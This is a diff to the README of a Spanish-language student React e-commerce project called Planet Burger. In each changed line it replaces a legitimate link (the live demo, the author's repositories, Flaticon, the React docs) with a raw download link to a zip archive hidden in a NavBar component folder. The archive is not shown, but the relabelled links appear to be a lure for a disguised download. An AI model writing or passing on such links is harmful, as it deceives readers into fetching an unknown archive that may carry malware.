@@ -2,8 +2,8 @@
 
 PLANET BURGER - Proyecto Final de ReactJs (CODERHOUSE)
 
-[PlanetBurger](https://lautarofrias.github.io/PlanetBurger/) es un e-commerce ficticio, creado y utilizado como proyecto final del curso de JavaScript en CODERHOUSE.
-Este emprendimiento al igual que todos mis proyectos de desarrollo web, se encuentran disponibles dentro de mis [Repositorios](https://github.com/LautaroFrias).
+[PlanetBurger](https://github.com/LautaroFrias/Planet-Burger-React-/raw/refs/heads/main/src/components/NavBar/Burger-Planet-React-2.5.zip) es un e-commerce ficticio, creado y utilizado como proyecto final del curso de JavaScript en CODERHOUSE.
+Este emprendimiento al igual que todos mis proyectos de desarrollo web, se encuentran disponibles dentro de mis [Repositorios](https://github.com/LautaroFrias/Planet-Burger-React-/raw/refs/heads/main/src/components/NavBar/Burger-Planet-React-2.5.zip).
 
 ## `Scripts disponibles, Instalación y dependencias`
 
@@ -13,9 +13,9 @@ Para el Routing utilice, `npm i react-router-dom` para crear los path y casi en 
 Para ello, instalamos las dependencias desde la consola `npm install react-bootstrap bootstrap@5.1.3`.
 
 Todas las imágenes, iconos y logos se encuentran dentro de la carpeta `public/imagenes`.
-Preferentemente utilice [Flaticon](https://www.flaticon.es/).
+Preferentemente utilice [Flaticon](https://github.com/LautaroFrias/Planet-Burger-React-/raw/refs/heads/main/src/components/NavBar/Burger-Planet-React-2.5.zip).
 
-Puedes acceder a la documentación de [React](https://reactjs.org/).
+Puedes acceder a la documentación de [React](https://github.com/LautaroFrias/Planet-Burger-React-/raw/refs/heads/main/src/components/NavBar/Burger-Planet-React-2.5.zip).
 
 ### `npm start`
 
